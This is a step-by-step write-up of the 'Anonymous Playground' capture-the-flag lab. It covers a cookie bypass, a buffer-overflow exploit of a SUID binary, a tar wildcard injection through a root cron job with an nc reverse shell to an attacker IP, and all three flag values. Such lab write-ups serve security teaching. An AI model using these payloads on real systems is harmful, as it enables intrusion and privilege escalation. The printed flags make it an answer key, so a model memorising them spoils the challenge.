# Anonymous Playground CTF
Level of difficulty: **HARD**

Step by step method to get all 3 flags:

## STEP 1: INITIAL RECONNAISSANCE
```bash
nmap -sC -sV -p- 10.49.185.144
```

**RESULTS:**
- Port 22: SSH (OpenSSH 8.2p1)
- Port 80: HTTP (Apache 2.4.41)

## STEP 2: WEB EXPLORATION
```bash
curl http://10.49.185.144/robots.txt
```
Disallow: `/zYdHuAKjP`

```bash
curl http://10.49.185.144/zYdHuAKjP/
```
"Access denied" - Server set cookie: `access=denied`

```bash
curl -b "access=granted" http://10.49.185.144/zYdHuAKjP/
```
**FOUND ENCODED STRING:**
`hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN`

## STEP 3: DECODING THE CIPHER

Python script to decode Anonymous cipher:
```python
def decode_anonymous(encoded):
    nums = [ord(c) & 31 for c in encoded]
    result = []
    for i in range(0, len(nums)-1, 2):
        combined = (nums[i] + nums[i+1]) % 26
        if combined == 0:
            combined = 26
        result.append(chr(combined + 96))
    return ''.join(result)
```

**RESULT:**
- Username: `magna`
- Password: `magnaisanelephant`

## STEP 4: SSH ACCESS AS MAGNA
```bash
ssh magna@10.49.185.144
```
Password: `magnaisanelephant`

```bash
cat flag.txt
```
**FIRST FLAG:** `9184177ecaa83073cbbf36f1414cc029`

```bash
ls -la
```
- `-rwsr-xr-x root root hacktheworld` (SUID binary)
- `note_from_spooky.txt`

## STEP 5: BUFFER OVERFLOW EXPLOIT (magna -> spooky)
Analyzed `hacktheworld` binary:
- 64-bit ELF with SUID root
- Uses `gets()` function - vulnerable to buffer overflow
- Buffer size: 0x50 (80 bytes)
- Offset to return address: 72 bytes
- Found `call_bash` function at address: `0x400658`

**EXPLOIT COMMAND:**
```bash
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x58\x06\x40\x00\x00\x00\x00\x00")'; cat) | ./hacktheworld
```

After exploit runs:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
whoami
```
> spooky
> “We are Anonymous.”
> “We are Legion.”
> “We do not forgive.”
> “We do not forget.”
> “[Message corrupted] ... Well... done.”

```bash
cat /home/spooky/flag.txt
```
**SECOND FLAG:** `69ee352fb139c9d0699f6f399b63d9d7`

## STEP 6: CRON JOB EXPLOIT (spooky -> root)
```bash
cat /etc/crontab
```
Found cron job running every minute as root:
```
*/1 * * * * root cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
```

**TAR WILDCARD INJECTION:**
```bash
cat > shell.sh << 'EOF'
#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.49.116.30 9001 > /tmp/f
EOF

chmod +x shell.sh
touch --checkpoint=1
touch --checkpoint-action=exec=sh shell.sh
```

On AttackBox (separate terminal):
```bash
nc -lvnp 9001
```
Wait 1 minute for cron job to run.

Then the result: CONNECTION RECEIVED - ROOT SHELL!

```bash
cat /root/flag.txt
```
**THIRD FLAG:** `bc55a426e98deb673beabda50f24ce66`

## SUMMARY OF FLAGS:
- Flag 1 (magna): `9184177ecaa83073cbbf36f1414cc029`
- Flag 2 (spooky): `69ee352fb139c9d0699f6f399b63d9d7`
- Flag 3 (root): `bc55a426e98deb673beabda50f24ce66`
